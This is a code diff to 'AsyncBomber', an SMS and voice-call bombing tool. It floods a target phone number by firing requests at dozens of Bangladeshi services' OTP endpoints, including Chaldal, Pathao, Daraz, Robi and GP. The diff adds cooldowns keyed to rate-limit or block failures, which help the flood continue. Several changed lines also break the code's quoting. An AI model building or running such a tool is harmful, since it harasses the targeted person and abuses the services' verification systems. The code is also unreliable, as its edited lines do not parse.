@@ -39,7 +39,7 @@ def clear():
         os.system('clear')
 
 def banner():
-    print(f"""
+    print(f""
 {C}╔══════════════════════════════════════════════════════════════╗
 ║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
 ║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
@@ -52,7 +52,7 @@ def banner():
 ║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
 ║ {P}           Engine: Asyncio & Aiohttp (High Speed)            {C}║
 ╚══════════════════════════════════════════════════════════════╝
-    """)
+    "")
 
 def get_random_name():
     return ''.join(random.choices(string.ascii_letters, k=8))
@@ -61,7 +61,7 @@ def get_random_email():
     return f"{get_random_name()}@gmail.com"
 
 def get_random_phone():
-    return "01" + "".join(random.choices(string.digits, k=9))
+    return "01" + ".join(random.choices(string.digits, k=9))
 
 class AsyncBomber:
     def __init__(self, target, limit, mode='sms', stop_event=None):
@@ -114,7 +114,7 @@ class AsyncBomber:
             headers.update(extra)
         return headers
 
-    async def log_event(self, api_name, success, status_code=None):
+    async def log_event(self, api_name, success, status_code=None, api_key=None):
         timestamp = datetime.now().strftime("%H:%M:%S")
         status = "SUCCESS" if success else "FAILED"
         log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}\n"
@@ -130,6 +130,10 @@ class AsyncBomber:
             self.failed += 1
             color = R
             icon = "✗"
+            # Add to cooldown if failed (e.g., rate limited or blocked)
+            if api_key:
+                cooldown_duration = random.randint(60, 120) # 1-2 minutes cooldown
+                self.api_cooldowns[api_key.lower()] = asyncio.get_event_loop().time() + cooldown_duration
 
         limit_str = "∞" if self.limit == 0 else str(self.limit)
         logging.info(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{W}")
@@ -142,10 +146,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phoneNumber": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API109 - Chaldal OTP", success, res.status)
+                await self.log_event("API109 - Chaldal OTP", success, res.status, api_key="API109 - Chaldal OTP")
                 return success
         except Exception:
-            await self.log_event("API109 - Chaldal OTP", False, "Error")
+            await self.log_event("API109 - Chaldal OTP", False, "Error", api_key="API109 - Chaldal OTP")
             return False
 
     async def api_api110___pathao_otp(self):
@@ -154,10 +158,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API110 - Pathao OTP", success, res.status)
+                await self.log_event("API110 - Pathao OTP", success, res.status, api_key="API110 - Pathao OTP")
                 return success
         except Exception:
-            await self.log_event("API110 - Pathao OTP", False, "Error")
+            await self.log_event("API110 - Pathao OTP", False, "Error", api_key="API110 - Pathao OTP")
             return False
 
     async def api_api111___sharetrip_otp(self):
@@ -166,10 +170,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"mobile": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API111 - ShareTrip OTP", success, res.status)
+                await self.log_event("API111 - ShareTrip OTP", success, res.status, api_key="API111 - ShareTrip OTP")
                 return success
         except Exception:
-            await self.log_event("API111 - ShareTrip OTP", False, "Error")
+            await self.log_event("API111 - ShareTrip OTP", False, "Error", api_key="API111 - ShareTrip OTP")
             return False
 
     async def api_api112___shohoz_otp(self):
@@ -178,10 +182,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API112 - Shohoz OTP", success, res.status)
+                await self.log_event("API112 - Shohoz OTP", success, res.status, api_key="API112 - Shohoz OTP")
                 return success
         except Exception:
-            await self.log_event("API112 - Shohoz OTP", False, "Error")
+            await self.log_event("API112 - Shohoz OTP", False, "Error", api_key="API112 - Shohoz OTP")
             return False
 
     async def api_api113___foodpanda_otp(self):
@@ -190,10 +194,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API113 - Foodpanda OTP", success, res.status)
+                await self.log_event("API113 - Foodpanda OTP", success, res.status, api_key="API113 - Foodpanda OTP")
                 return success
         except Exception:
-            await self.log_event("API113 - Foodpanda OTP", False, "Error")
+            await self.log_event("API113 - Foodpanda OTP", False, "Error", api_key="API113 - Foodpanda OTP")
             return False
 
     async def api_api114___hungrynaki_otp(self):
@@ -202,10 +206,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API114 - HungryNaki OTP", success, res.status)
+                await self.log_event("API114 - HungryNaki OTP", success, res.status, api_key="API114 - HungryNaki OTP")
                 return success
         except Exception:
-            await self.log_event("API114 - HungryNaki OTP", False, "Error")
+            await self.log_event("API114 - HungryNaki OTP", False, "Error", api_key="API114 - HungryNaki OTP")
             return False
 
     async def api_api115___rokomari_otp(self):
@@ -214,10 +218,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API115 - Rokomari OTP", success, res.status)
+                await self.log_event("API115 - Rokomari OTP", success, res.status, api_key="API115 - Rokomari OTP")
                 return success
         except Exception:
-            await self.log_event("API115 - Rokomari OTP", False, "Error")
+            await self.log_event("API115 - Rokomari OTP", False, "Error", api_key="API115 - Rokomari OTP")
             return False
 
     async def api_api116___evaly_otp(self):
@@ -226,10 +230,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API116 - Evaly OTP", success, res.status)
+                await self.log_event("API116 - Evaly OTP", success, res.status, api_key="API116 - Evaly OTP")
                 return success
         except Exception:
-            await self.log_event("API116 - Evaly OTP", False, "Error")
+            await self.log_event("API116 - Evaly OTP", False, "Error", api_key="API116 - Evaly OTP")
             return False
 
     async def api_api117___amarpay_otp(self):
@@ -238,10 +242,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API117 - AmarPay OTP", success, res.status)
+                await self.log_event("API117 - AmarPay OTP", success, res.status, api_key="API117 - AmarPay OTP")
                 return success
         except Exception:
-            await self.log_event("API117 - AmarPay OTP", False, "Error")
+            await self.log_event("API117 - AmarPay OTP", False, "Error", api_key="API117 - AmarPay OTP")
             return False
 
     async def api_api118___pickaboo_otp(self):
@@ -250,10 +254,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API118 - Pickaboo OTP", success, res.status)
+                await self.log_event("API118 - Pickaboo OTP", success, res.status, api_key="API118 - Pickaboo OTP")
                 return success
         except Exception:
-            await self.log_event("API118 - Pickaboo OTP", False, "Error")
+            await self.log_event("API118 - Pickaboo OTP", False, "Error", api_key="API118 - Pickaboo OTP")
             return False
 
     async def api_api119___ajkerdeal_otp(self):
@@ -262,10 +266,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API119 - AjkerDeal OTP", success, res.status)
+                await self.log_event("API119 - AjkerDeal OTP", success, res.status, api_key="API119 - AjkerDeal OTP")
                 return success
         except Exception:
-            await self.log_event("API119 - AjkerDeal OTP", False, "Error")
+            await self.log_event("API119 - AjkerDeal OTP", False, "Error", api_key="API119 - AjkerDeal OTP")
             return False
 
     async def api_api120___priyoshop_otp(self):
@@ -274,10 +278,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API120 - PriyoShop OTP", success, res.status)
+                await self.log_event("API120 - PriyoShop OTP", success, res.status, api_key="API120 - PriyoShop OTP")
                 return success
         except Exception:
-            await self.log_event("API120 - PriyoShop OTP", False, "Error")
+            await self.log_event("API120 - PriyoShop OTP", False, "Error", api_key="API120 - PriyoShop OTP")
             return False
 
     async def api_api121___bikroy_otp_v2(self):
@@ -286,10 +290,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API121 - Bikroy OTP V2", success, res.status)
+                await self.log_event("API121 - Bikroy OTP V2", success, res.status, api_key="API121 - Bikroy OTP V2")
                 return success
         except Exception:
-            await self.log_event("API121 - Bikroy OTP V2", False, "Error")
+            await self.log_event("API121 - Bikroy OTP V2", False, "Error", api_key="API121 - Bikroy OTP V2")
             return False
 
     async def api_api122___daraz_otp_v2(self):
@@ -298,10 +302,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API122 - Daraz OTP V2", success, res.status)
+                await self.log_event("API122 - Daraz OTP V2", success, res.status, api_key="API122 - Daraz OTP V2")
                 return success
         except Exception:
-            await self.log_event("API122 - Daraz OTP V2", False, "Error")
+            await self.log_event("API122 - Daraz OTP V2", False, "Error", api_key="API122 - Daraz OTP V2")
             return False
 
     # Call APIs
@@ -312,10 +316,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL1 - Robi Call OTP", success, res.status)
+                await self.log_event("CALL1 - Robi Call OTP", success, res.status, api_key="CALL1 - Robi Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL1 - Robi Call OTP", False, "Error")
+            await self.log_event("CALL1 - Robi Call OTP", False, "Error", api_key="CALL1 - Robi Call OTP")
             return False
 
     async def api_call2___daraz_call_otp(self):
@@ -324,10 +328,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL2 - Daraz Call OTP", success, res.status)
+                await self.log_event("CALL2 - Daraz Call OTP", success, res.status, api_key="CALL2 - Daraz Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL2 - Daraz Call OTP", False, "Error")
+            await self.log_event("CALL2 - Daraz Call OTP", False, "Error", api_key="CALL2 - Daraz Call OTP")
             return False
 
     async def api_call3___pathao_call_otp(self):
@@ -336,10 +340,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL3 - Pathao Call OTP", success, res.status)
+                await self.log_event("CALL3 - Pathao Call OTP", success, res.status, api_key="CALL3 - Pathao Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL3 - Pathao Call OTP", False, "Error")
+            await self.log_event("CALL3 - Pathao Call OTP", False, "Error", api_key="CALL3 - Pathao Call OTP")
             return False
 
     async def api_call4___shohoz_call_otp(self):
@@ -348,10 +352,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL4 - Shohoz Call OTP", success, res.status)
+                await self.log_event("CALL4 - Shohoz Call OTP", success, res.status, api_key="CALL4 - Shohoz Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL4 - Shohoz Call OTP", False, "Error")
+            await self.log_event("CALL4 - Shohoz Call OTP", False, "Error", api_key="CALL4 - Shohoz Call OTP")
             return False
 
     async def api_call5___chaldal_call_otp(self):
@@ -360,10 +364,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phoneNumber": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL5 - Chaldal Call OTP", success, res.status)
+                await self.log_event("CALL5 - Chaldal Call OTP", success, res.status, api_key="CALL5 - Chaldal Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL5 - Chaldal Call OTP", False, "Error")
+            await self.log_event("CALL5 - Chaldal Call OTP", False, "Error", api_key="CALL5 - Chaldal Call OTP")
             return False
 
     async def api_call6___foodpanda_call_otp(self):
@@ -372,10 +376,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL6 - Foodpanda Call OTP", success, res.status)
+                await self.log_event("CALL6 - Foodpanda Call OTP", success, res.status, api_key="CALL6 - Foodpanda Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL6 - Foodpanda Call OTP", False, "Error")
+            await self.log_event("CALL6 - Foodpanda Call OTP", False, "Error", api_key="CALL6 - Foodpanda Call OTP")
             return False
 
     async def api_call7___evaly_call_otp(self):
@@ -384,10 +388,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL7 - Evaly Call OTP", success, res.status)
+                await self.log_event("CALL7 - Evaly Call OTP", success, res.status, api_key="CALL7 - Evaly Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL7 - Evaly Call OTP", False, "Error")
+            await self.log_event("CALL7 - Evaly Call OTP", False, "Error", api_key="CALL7 - Evaly Call OTP")
             return False
 
     async def api_call8___hungrynaki_call_otp(self):
@@ -396,10 +400,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL8 - HungryNaki Call OTP", success, res.status)
+                await self.log_event("CALL8 - HungryNaki Call OTP", success, res.status, api_key="CALL8 - HungryNaki Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL8 - HungryNaki Call OTP", False, "Error")
+            await self.log_event("CALL8 - HungryNaki Call OTP", False, "Error", api_key="CALL8 - HungryNaki Call OTP")
             return False
 
     async def api_call9___rokomari_call_otp(self):
@@ -408,10 +412,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target, "type": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL9 - Rokomari Call OTP", success, res.status)
+                await self.log_event("CALL9 - Rokomari Call OTP", success, res.status, api_key="CALL9 - Rokomari Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL9 - Rokomari Call OTP", False, "Error")
+            await self.log_event("CALL9 - Rokomari Call OTP", False, "Error", api_key="CALL9 - Rokomari Call OTP")
             return False
 
     async def api_call10___airtel_call_otp(self):
@@ -420,10 +424,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"msisdn": target, "type": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL10 - Airtel Call OTP", success, res.status)
+                await self.log_event("CALL10 - Airtel Call OTP", success, res.status, api_key="CALL10 - Airtel Call OTP")
                 return success
         except Exception:
-            await self.log_event("CALL10 - Airtel Call OTP", False, "Error")
+            await self.log_event("CALL10 - Airtel Call OTP", False, "Error", api_key="CALL10 - Airtel Call OTP")
             return False
 
     async def api_call11___gp_call_otp_v2(self):
@@ -432,10 +436,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"phone": target, "method": "voice"}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL11 - GP Call OTP V2", success, res.status)
+                await self.log_event("CALL11 - GP Call OTP V2", success, res.status, api_key="CALL11 - GP Call OTP V2")
                 return success
         except Exception:
-            await self.log_event("CALL11 - GP Call OTP V2", False, "Error")
+            await self.log_event("CALL11 - GP Call OTP V2", False, "Error", api_key="CALL11 - GP Call OTP V2")
             return False
 
     async def api_call12___extra_call_api_12(self):
@@ -456,10 +460,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL12 - Extra API 12", success, res.status)
+                await self.log_event("CALL12 - Extra API 12", success, res.status, api_key="CALL12 - Extra API 12")
                 return success
         except Exception:
-            await self.log_event("CALL12 - Extra API 12", False, "Error")
+            await self.log_event("CALL12 - Extra API 12", False, "Error", api_key="CALL12 - Extra API 12")
             return False
 
     async def api_call13___extra_call_api_13(self):
@@ -480,10 +484,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL13 - Extra API 13", success, res.status)
+                await self.log_event("CALL13 - Extra API 13", success, res.status, api_key="CALL13 - Extra API 13")
                 return success
         except Exception:
-            await self.log_event("CALL13 - Extra API 13", False, "Error")
+            await self.log_event("CALL13 - Extra API 13", False, "Error", api_key="CALL13 - Extra API 13")
             return False
 
     async def api_call14___extra_call_api_14(self):
@@ -504,10 +508,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL14 - Extra API 14", success, res.status)
+                await self.log_event("CALL14 - Extra API 14", success, res.status, api_key="CALL14 - Extra API 14")
                 return success
         except Exception:
-            await self.log_event("CALL14 - Extra API 14", False, "Error")
+            await self.log_event("CALL14 - Extra API 14", False, "Error", api_key="CALL14 - Extra API 14")
             return False
 
     async def api_call15___extra_call_api_15(self):
@@ -528,10 +532,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL15 - Extra API 15", success, res.status)
+                await self.log_event("CALL15 - Extra API 15", success, res.status, api_key="CALL15 - Extra API 15")
                 return success
         except Exception:
-            await self.log_event("CALL15 - Extra API 15", False, "Error")
+            await self.log_event("CALL15 - Extra API 15", False, "Error", api_key="CALL15 - Extra API 15")
             return False
 
     async def api_call16___extra_call_api_16(self):
@@ -552,10 +556,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL16 - Extra API 16", success, res.status)
+                await self.log_event("CALL16 - Extra API 16", success, res.status, api_key="CALL16 - Extra API 16")
                 return success
         except Exception:
-            await self.log_event("CALL16 - Extra API 16", False, "Error")
+            await self.log_event("CALL16 - Extra API 16", False, "Error", api_key="CALL16 - Extra API 16")
             return False
 
     async def api_call17___extra_call_api_17(self):
@@ -576,10 +580,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL17 - Extra API 17", success, res.status)
+                await self.log_event("CALL17 - Extra API 17", success, res.status, api_key="CALL17 - Extra API 17")
                 return success
         except Exception:
-            await self.log_event("CALL17 - Extra API 17", False, "Error")
+            await self.log_event("CALL17 - Extra API 17", False, "Error", api_key="CALL17 - Extra API 17")
             return False
 
     async def api_call18___extra_call_api_18(self):
@@ -600,10 +604,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL18 - Extra API 18", success, res.status)
+                await self.log_event("CALL18 - Extra API 18", success, res.status, api_key="CALL18 - Extra API 18")
                 return success
         except Exception:
-            await self.log_event("CALL18 - Extra API 18", False, "Error")
+            await self.log_event("CALL18 - Extra API 18", False, "Error", api_key="CALL18 - Extra API 18")
             return False
 
     async def api_call19___extra_call_api_19(self):
@@ -624,10 +628,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL19 - Extra API 19", success, res.status)
+                await self.log_event("CALL19 - Extra API 19", success, res.status, api_key="CALL19 - Extra API 19")
                 return success
         except Exception:
-            await self.log_event("CALL19 - Extra API 19", False, "Error")
+            await self.log_event("CALL19 - Extra API 19", False, "Error", api_key="CALL19 - Extra API 19")
             return False
 
     async def api_call20___extra_call_api_20(self):
@@ -648,10 +652,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL20 - Extra API 20", success, res.status)
+                await self.log_event("CALL20 - Extra API 20", success, res.status, api_key="CALL20 - Extra API 20")
                 return success
         except Exception:
-            await self.log_event("CALL20 - Extra API 20", False, "Error")
+            await self.log_event("CALL20 - Extra API 20", False, "Error", api_key="CALL20 - Extra API 20")
             return False
 
     async def api_call21___extra_call_api_21(self):
@@ -672,10 +676,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL21 - Extra API 21", success, res.status)
+                await self.log_event("CALL21 - Extra API 21", success, res.status, api_key="CALL21 - Extra API 21")
                 return success
         except Exception:
-            await self.log_event("CALL21 - Extra API 21", False, "Error")
+            await self.log_event("CALL21 - Extra API 21", False, "Error", api_key="CALL21 - Extra API 21")
             return False
 
     async def api_call22___extra_call_api_22(self):
@@ -696,10 +700,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL22 - Extra API 22", success, res.status)
+                await self.log_event("CALL22 - Extra API 22", success, res.status, api_key="CALL22 - Extra API 22")
                 return success
         except Exception:
-            await self.log_event("CALL22 - Extra API 22", False, "Error")
+            await self.log_event("CALL22 - Extra API 22", False, "Error", api_key="CALL22 - Extra API 22")
             return False
 
     async def api_call23___extra_call_api_23(self):
@@ -720,10 +724,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL23 - Extra API 23", success, res.status)
+                await self.log_event("CALL23 - Extra API 23", success, res.status, api_key="CALL23 - Extra API 23")
                 return success
         except Exception:
-            await self.log_event("CALL23 - Extra API 23", False, "Error")
+            await self.log_event("CALL23 - Extra API 23", False, "Error", api_key="CALL23 - Extra API 23")
             return False
 
     async def api_call24___extra_call_api_24(self):
@@ -744,10 +748,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL24 - Extra API 24", success, res.status)
+                await self.log_event("CALL24 - Extra API 24", success, res.status, api_key="CALL24 - Extra API 24")
                 return success
         except Exception:
-            await self.log_event("CALL24 - Extra API 24", False, "Error")
+            await self.log_event("CALL24 - Extra API 24", False, "Error", api_key="CALL24 - Extra API 24")
             return False
 
     async def api_call25___extra_call_api_25(self):
@@ -768,10 +772,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL25 - Extra API 25", success, res.status)
+                await self.log_event("CALL25 - Extra API 25", success, res.status, api_key="CALL25 - Extra API 25")
                 return success
         except Exception:
-            await self.log_event("CALL25 - Extra API 25", False, "Error")
+            await self.log_event("CALL25 - Extra API 25", False, "Error", api_key="CALL25 - Extra API 25")
             return False
 
     async def api_call26___extra_call_api_26(self):
@@ -792,10 +796,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL26 - Extra API 26", success, res.status)
+                await self.log_event("CALL26 - Extra API 26", success, res.status, api_key="CALL26 - Extra API 26")
                 return success
         except Exception:
-            await self.log_event("CALL26 - Extra API 26", False, "Error")
+            await self.log_event("CALL26 - Extra API 26", False, "Error", api_key="CALL26 - Extra API 26")
             return False
 
     async def api_call27___extra_call_api_27(self):
@@ -816,10 +820,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL27 - Extra API 27", success, res.status)
+                await self.log_event("CALL27 - Extra API 27", success, res.status, api_key="CALL27 - Extra API 27")
                 return success
         except Exception:
-            await self.log_event("CALL27 - Extra API 27", False, "Error")
+            await self.log_event("CALL27 - Extra API 27", False, "Error", api_key="CALL27 - Extra API 27")
             return False
 
     async def api_call28___extra_call_api_28(self):
@@ -840,10 +844,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL28 - Extra API 28", success, res.status)
+                await self.log_event("CALL28 - Extra API 28", success, res.status, api_key="CALL28 - Extra API 28")
                 return success
         except Exception:
-            await self.log_event("CALL28 - Extra API 28", False, "Error")
+            await self.log_event("CALL28 - Extra API 28", False, "Error", api_key="CALL28 - Extra API 28")
             return False
 
     async def api_call29___extra_call_api_29(self):
@@ -864,10 +868,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL29 - Extra API 29", success, res.status)
+                await self.log_event("CALL29 - Extra API 29", success, res.status, api_key="CALL29 - Extra API 29")
                 return success
         except Exception:
-            await self.log_event("CALL29 - Extra API 29", False, "Error")
+            await self.log_event("CALL29 - Extra API 29", False, "Error", api_key="CALL29 - Extra API 29")
             return False
 
     async def api_call30___extra_call_api_30(self):
@@ -888,10 +892,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL30 - Extra API 30", success, res.status)
+                await self.log_event("CALL30 - Extra API 30", success, res.status, api_key="CALL30 - Extra API 30")
                 return success
         except Exception:
-            await self.log_event("CALL30 - Extra API 30", False, "Error")
+            await self.log_event("CALL30 - Extra API 30", False, "Error", api_key="CALL30 - Extra API 30")
             return False
 
     async def api_call31___extra_call_api_31(self):
@@ -912,10 +916,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL31 - Extra API 31", success, res.status)
+                await self.log_event("CALL31 - Extra API 31", success, res.status, api_key="CALL31 - Extra API 31")
                 return success
         except Exception:
-            await self.log_event("CALL31 - Extra API 31", False, "Error")
+            await self.log_event("CALL31 - Extra API 31", False, "Error", api_key="CALL31 - Extra API 31")
             return False
 
     async def api_call32___extra_call_api_32(self):
@@ -936,10 +940,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL32 - Extra API 32", success, res.status)
+                await self.log_event("CALL32 - Extra API 32", success, res.status, api_key="CALL32 - Extra API 32")
                 return success
         except Exception:
-            await self.log_event("CALL32 - Extra API 32", False, "Error")
+            await self.log_event("CALL32 - Extra API 32", False, "Error", api_key="CALL32 - Extra API 32")
             return False
 
     async def api_call33___extra_call_api_33(self):
@@ -960,10 +964,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL33 - Extra API 33", success, res.status)
+                await self.log_event("CALL33 - Extra API 33", success, res.status, api_key="CALL33 - Extra API 33")
                 return success
         except Exception:
-            await self.log_event("CALL33 - Extra API 33", False, "Error")
+            await self.log_event("CALL33 - Extra API 33", False, "Error", api_key="CALL33 - Extra API 33")
             return False
 
     async def api_call34___extra_call_api_34(self):
